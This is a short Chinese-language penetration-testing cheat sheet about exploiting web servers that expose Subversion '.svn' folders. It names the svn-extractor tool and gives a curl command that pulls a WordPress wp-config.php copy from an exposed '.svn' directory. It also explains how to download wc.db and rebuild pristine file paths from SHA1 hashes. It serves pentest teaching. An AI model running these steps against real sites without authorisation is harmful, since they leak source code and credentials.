# Subversion

> Subversion（通常简称为 SVN）是一种集中式的版本控制系统（VCS），在软件开发行业中被广泛使用。Subversion 最初由 CollabNet Inc. 在 2000 年开发，旨在成为 CVS（Concurrent Versions System）的改进版本，并因其稳健性和可靠性而广受欢迎。

## 概述

* [工具](#工具)
* [方法论](#方法论)
* [参考文献](#参考文献)

## 工具

* [anantshri/svn-extractor](https://github.com/anantshri/svn-extractor) - 一个简单的脚本，通过暴露在网络上的 `.SVN` 文件夹提取所有 Web 资源。

    ```powershell
    python svn-extractor.py --url "包含 .svn 的 URL"
    ```

## 方法论

```powershell
curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base
```

1. 从 `http://server/path_to_vulnerable_site/.svn/wc.db` 下载 SVN 数据库

    ```powershell
    INSERT INTO "NODES" VALUES(1,'trunk/test.txt',0,'trunk',1,'trunk/test.txt',2,'normal',NULL,NULL,'file',X'2829',NULL,'$sha1$945a60e68acc693fcb74abadb588aac1a9135f62',NULL,2,1456056344886288,'bl4de',38,1456056261000000,NULL,NULL);
    ```

2. 下载感兴趣的文件
    * 去掉 `$sha1$` 前缀
    * 添加 `.svn-base` 后缀
    * 使用哈希值的第一个字节作为 `pristine/` 目录的子目录（此处为 `94`）
    * 创建完整路径，即：`http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base`

## 参考文献

* [SVN 提取器针对 Web 渗透测试人员 - Anant Shrivastava - 2013年3月26日](http://blog.anantshri.info/svn-extractor-for-web-pentesters/)